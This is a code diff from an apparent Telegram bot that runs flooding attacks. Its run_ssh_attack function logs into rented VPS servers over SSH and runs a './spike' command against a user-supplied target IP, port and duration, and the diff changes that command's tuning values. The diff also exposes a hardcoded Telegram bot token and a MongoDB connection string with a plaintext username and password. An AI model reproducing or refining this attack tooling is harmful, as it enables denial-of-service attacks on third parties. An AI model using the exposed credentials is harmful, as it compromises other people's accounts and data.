@@ -14,9 +14,9 @@ logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(
 logger = logging.getLogger(__name__)
 
 # Telegram API & MongoDB credentials (REPLACE WITH YOURS)
-TELEGRAM_BOT_TOKEN = "7608024904:AAEzpdFPCHzmGi5WXKneCZnJ6RNaHQR17AY"
+TELEGRAM_BOT_TOKEN = "7608024904:AAGk4S8GPcEkotomWma57tVoy8Dyr63sCDE"
 MONGO_URI = "mongodb+srv://donmourya248:Santosh700@redhat.drq43.mongodb.net/RedHat?retryWrites=true&w=majority&appName=RedHat"
-DB_NAME = "Monsterr"
+DB_NAME = "MONSTER"
 
 # Database setup
 client = MongoClient(MONGO_URI)
@@ -491,7 +491,7 @@ async def run_ssh_attack(vps_data, target_ip, port, duration, chat_id, context, 
             if attack_type == "aws":
                 command = f"./spike {target_ip} {port} {duration} 6 900"
             else:
-                command = f"./spike {target_ip} {port} {duration} 1024 900"
+                command = f"./spike {target_ip} {port} {duration} 1027 931"
 
             await conn.run(command, check=True)
             await context.bot.send_message(chat_id, f"✅ *Attack executed on ({attack_type})*", parse_mode="Markdown")
